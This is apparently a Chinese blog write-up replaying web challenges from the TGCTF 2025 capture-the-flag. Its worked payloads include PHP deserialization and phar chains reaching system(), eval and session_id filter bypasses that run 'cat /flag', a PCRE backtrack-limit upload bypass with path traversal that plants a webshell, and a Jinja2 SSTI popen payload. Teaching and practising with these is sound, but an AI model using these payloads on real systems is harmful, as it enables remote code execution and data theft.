---

title: "TGCTF 2025 web(复现"
date: 2025-06-01 21:16:23
author: Xendr1a

---



TGCTF 2025 web(复现

日期：2025-06-01 21:16:23

前端GAME

前端game的三个阶段分别对应着三个cve

CVE-2025-30208 【CVE-2025-30208】| Vite-漏洞分析与复现-CSDN博客

CVE-2025-31486 复现与修复指南：Vite任意文件读取漏洞bypass（CVE-2025-31486）

CVE-2025-32395 复现与修复指南：Vite再次bypass（CVE-2025-32395）

什么文件上传？

我们进入首页是一个文件上传的界面，按f12发现提示关键词机器人我们直接去看robots.txt

![rId24.png](/img/TGCTF-2025-web-复现/rId24.png)

我们进入/class.php,

```php
<?php    highlight_file(__FILE__);    error_reporting(0);    function best64_decode($str)    {        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));    }    class yesterday {        public $learn;        public $study="study";        public $try;        public function __construct()        {            $this->learn = "learn<br>";        }        public function __destruct()        {            echo "You studied hard yesterday.<br>";            return $this->study->hard();        }    }    class today {        public $doing;        public $did;        public $done;        public function __construct(){            $this->did = "What you did makes you outstanding.<br>";        }        public function __call($arg1, $arg2)        {            $this->done = "And what you've done has given you a choice.<br>";            echo $this->done;            if(md5(md5($this->doing))==666){                return $this->doing();            }            else{                return $this->doing->better;            }        }    }    class tommoraw {        public $good;        public $bad;        public $soso;        public function __invoke(){            $this->good="You'll be good tommoraw!<br>";            echo $this->good;        }        public function __get($arg1){            $this->bad="You'll be bad tommoraw!<br>";        }    }    class future{        private $impossible="How can you get here?<br>";        private $out;        private $no;        public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;        public function __set($arg1, $arg2) {            if ($this->out->useful7) {                echo "Seven is my lucky number<br>";                system('whoami');            }        }        public function __toString(){            echo "This is your future.<br>";            system($_POST["wow"]);            return "win";        }        public function __destruct(){            $this->no = "no";            return $this->no;        }    }    if (file_exists($_GET['filename'])){        echo "Focus on the previous step!<br>";    }    else{        $data=substr($_GET['filename'],0,-4);        unserialize(best64_decode($data));    }    // You learn yesterday, you choose today, can you get to your future??>
```

我们发现了这里，应该是我们要到达的地方，那我们如何调用__toString()方法呢

public function __toString(){            echo "This is your future.<br>";            system($_POST["wow"]);            return "win";        }

然后注意到

public function __call($arg1, $arg2)        {            $this->done = "And what you've done has given you a choice.<br>";            echo $this->done;            if(md5(md5($this->doing))==666){                return $this->doing();            }            else{                return $this->doing->better;            }

PHP在计算MD5哈希前会将对象转换为字符串，所以会自动调用 future类的__toString 方法那我们现在构造

```php
<?php
class yesterday {    public $study;}class today {    public $doing;}class future {}$future = new future();$today = new today();$today->doing = $future;$yesterday = new yesterday();$yesterday->study = $today;echo serialize($yesterday);?>O:9:"yesterday":1:{s:5:"study";O:5:"today":1:{s:5:"doing";O:6:"future":0:{}}}
```

然后看到

function best64_decode($str)    {        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));    }//五次的decode,所以我们需要五次的encode

和

if (file_exists($_GET['filename'])){        echo "Focus on the previous step!<br>";    }    else{        $data=substr($_GET['filename'],0,-4);        unserialize(best64_decode($data));    }//我们需要在最后追加四个字符，加上aaaa

我们得到Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NsWlVTbUZXUlRWUFZHMXpNVlpYU1hsaVIzQk9UVlZzTkZZeWRHOWpiVVpXVDBoa1VGSkdjRkJXYTJNMVkwWndSbGw2Vm1oTlYzaGFXVlJLYzFWSFJuSldWRXBoVmtVMVQxUnRjekZXVjBsNVlrZEdVMlZ0ZUROWFZ6QjRZVzFHVms5SVpGQlNSbkJRV1Zjd05XTkdaSFJPVm1ST1VqRktXbFV5TVRSVGJVWjBUMVJPVlUxcVZYZFVNV1JoVjFVeFNGbDZNRDA9aaaa

![rId27.png](/img/TGCTF-2025-web-复现/rId27.png)

什么文件上传？（复仇）

我们直接看到phar，又因为主页有个文件上传点，可以想到文件上传+phar反序列化

![rId24.png](/img/TGCTF-2025-web-复现/rId24.png)

我们先生成个phar.phar

```php
<?php
error_reporting(0);class yesterday {    public $learn;    public $study="study";    public $try;    public function __destruct()    {        // echo "You studied hard yesterday.<br>";        return $this->study->hard();    }}class today {    public $doing;    public $did;    public $done;    public function __call($arg1, $arg2)    {        $this->done = "And what you've done has given you a choice.<br>";        // echo $this->done;        if(md5(md5($this->doing))==666){            return $this->doing();        }        else{            return $this->doing->better;        }    }}class future{    private $impossible="How can you get here?<br>";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __toString(){        // echo "This is your future.<br>";        # system($_POST["wow"]);        return "win";    }}@unlink("phar.phar");$phar = new Phar("phar.phar");$phar->startBuffering();$phar->setStub("

```php
<?php __HALT_COMPILER(); ?>");$a = new yesterday();$b = new today();$c = new future();$a->study = $b;$b->doing = $c;$phar->setMetadata($a);$phar->addFromString("test.txt", "test");$phar->stopBuffering();?>
```

生成了phar.phar，然后发现phar被过滤了，结合robots.txt的提示，我们爆破出后缀为atg

![rId33.png](/img/TGCTF-2025-web-复现/rId33.png)

我们读取环境变量，发现flag。

![rId36.png](/img/TGCTF-2025-web-复现/rId36.png)

AAA偷渡阴平

```php
<?php$tgctf2025=$_GET['tgctf2025'];if(!preg_match("/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $tgctf2025)){    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi    eval($tgctf2025);}else{    die('(╯‵□′)╯炸弹！•••*～●');}highlight_file(__FILE__);
```

过滤了好多东西，但是无参rce的函数没有过滤

?tgctf2025=eval(end(current(get_defined_vars())));&cmd=system('cat /f*');get_defined_vars()返回包含所有变量的数组（包括$_GET）current()取第一个元素（tgctf2025的值）end()取最后一个元素（b的值）eval()执行system('cat /flag')命令

AAA偷渡阴平（复仇）

```php
<?php$tgctf2025=$_GET['tgctf2025'];if(!preg_match("/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i", $tgctf2025)){    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi    eval($tgctf2025);}else{    die('(╯‵□′)╯炸弹！•••*～●');}highlight_file(__FILE__);
```

我们可以看到过滤了一万个函数不会了看看wp，利用的是无参中的session

?tgctf2025=session_start();system(hex2bin(session_id()));PHPSESSID=636174202f666c6167       //cat /flag

(ez)upload

我们扫到了index.php.bak和upload.php.bak

```php
<?php
define('UPLOAD_PATH', __DIR__ . '/uploads/');$is_upload = false;$msg = null;$status_code = 200; // 默认状态码为 200if (isset($_POST['submit'])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array("php", "php5", "php4", "php3", "php2", "html", "htm", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess");        if (isset($_GET['name'])) {            $file_name = $_GET['name'];        } else {            $file_name = basename($_FILES['name']['name']);        }        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES['name']['tmp_name'];            $file_content = file_get_contents($temp_file);            if (preg_match('/.+?</s', $file_content)) {                $msg = '文件内容包含非法字符，禁止上传！';                $status_code = 403; // 403 表示禁止访问            } else {                $img_path = UPLOAD_PATH . $file_name;                if (move_uploaded_file($temp_file, $img_path)) {                    $is_upload = true;                    $msg = '文件上传成功！';                } else {                    $msg = '上传出错！';                    $status_code = 500; // 500 表示服务器内部错误                }            }        } else {            $msg = '禁止保存为该类型文件！';            $status_code = 403; // 403 表示禁止访问        }    } else {        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';        $status_code = 404; // 404 表示资源未找到    }}// 设置 HTTP 状态码http_response_code($status_code);// 输出结果echo json_encode([    'status_code' => $status_code,    'msg' => $msg,]);
```

我们看到

if (preg_match('/.+?</s', $file_content)) {                $msg = '文件内容包含非法字符，禁止上传！';                $status_code = 403; // 403 表示禁止访问            }

是利用preg_match函数进行匹配的，我们可以利用PCRE回溯次数限制来绕过然后后面加上一句话木马

101万左右的任意字符+然后name的话，通过传参name来进行目录穿越上传文件也就是../

![rId42.png](/img/TGCTF-2025-web-复现/rId42.png)

然后访问uploads/1.php，flag在环境变量里面

直面天命

看到了hint

![rId46.png](/img/TGCTF-2025-web-复现/rId46.png)

hint：有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!爆破得到/aazz

![rId49.png](/img/TGCTF-2025-web-复现/rId49.png)

爆破得到filename，试试有没有文件读取

![rId52.png](/img/TGCTF-2025-web-复现/rId52.png)

抽象了，直接读到了flag

直面天命（复仇）

上面那个是非预期吧，然后我们接着这个读取继续做，我们读取/app.py

```python
import osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=['{','}','popen','os','import','eval','_','system','read','base','globals']def waf(name):    for x in black_list:        if x in name.lower():            return True    return Falsedef is_typable(char):    # 定义可通过标准 QWERTY 键盘输入的字符集    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace    return char in typable_chars@app.route('/')def home():    return send_from_directory('static', 'index.html')@app.route('/jingu', methods=['POST'])def greet():    template1=""    template2=""    name = request.form.get('name')    template = f'{name}'    if waf(name):        template = '想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹<br>'    else:        k=0        for i in name:            if is_typable(i):                continue            k=1            break        if k==1:            if not (secret_key[:2] in name and secret_key[2:]):                template = '连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧<br><br>再去西行历练历练<br><br>'                return render_template_string(template)            template1 = "“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”<br>最后，如果你用了cat，就可以见到齐天大圣了<br>"            template= template.replace("直面","{{").replace("天命","}}")            template = template    if "cat" in template:        template2 = '<br>或许你这只叫天命人的猴子，真的能做到？<br><br>'    try:        return template1+render_template_string(template)+render_template_string(template2)    except Exception as e:        error_message = f"500报错了，查询语句如下：<br>{template}"        return error_message, 400@app.route('/hint', methods=['GET'])def hinter():    template="hint：<br>有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!"    return render_template_string(template)@app.route('/aazz', methods=['GET'])def finder():    filename = request.args.get('filename', '')    if filename == "":        return send_from_directory('static', 'file.html')    if not filename.replace('_', '').isalnum():        content = jsonify({'error': '只允许字母和数字！'}), 400    if os.path.isfile(filename):        try:            with open(filename, 'r') as file:                content = file.read()            return content        except Exception as e:            return jsonify({'error': str(e)}), 500    else:        return jsonify({'error': '路径不存在或者路径非法'}), 404if __name__ == '__main__':    app.run(host='0.0.0.0', port=80)

看到了这个from a.b.c.d.secret import secret_key可以发现后面会将直面天命变成{{}}

template= template.replace("直面","{{").replace("天命","}}")

最后我们就可以构造payload了

name=直面""[request.args.a1][request.args.a2][0][request.args.a3]()[132][request.args.a4][request.args.a5]['p''open']('cat+/flag')['r''ead']()天命?a1=__class__&a2=__bases__&a3=__subclasses__&a4=__init__&a5=__globals__

TG_wordpress

环境好像没了，应该是CVE-2020-25213

火眼辩魑魅

扫到了robots.txt
```

![rId58.png](/img/TGCTF-2025-web-复现/rId58.png)

我们发现tgshell.php有一个一句话木马，打开蚁剑连一下下

![rId61.png](/img/TGCTF-2025-web-复现/rId61.png)

连上了，里面就是flag

预期解是，tgxff有个ssti在xff那里

![rId64.png](/img/TGCTF-2025-web-复现/rId64.png)

这题看到好多种非预期了

小结

还有几道题后面再补了，有点难，后面再补了...(待续


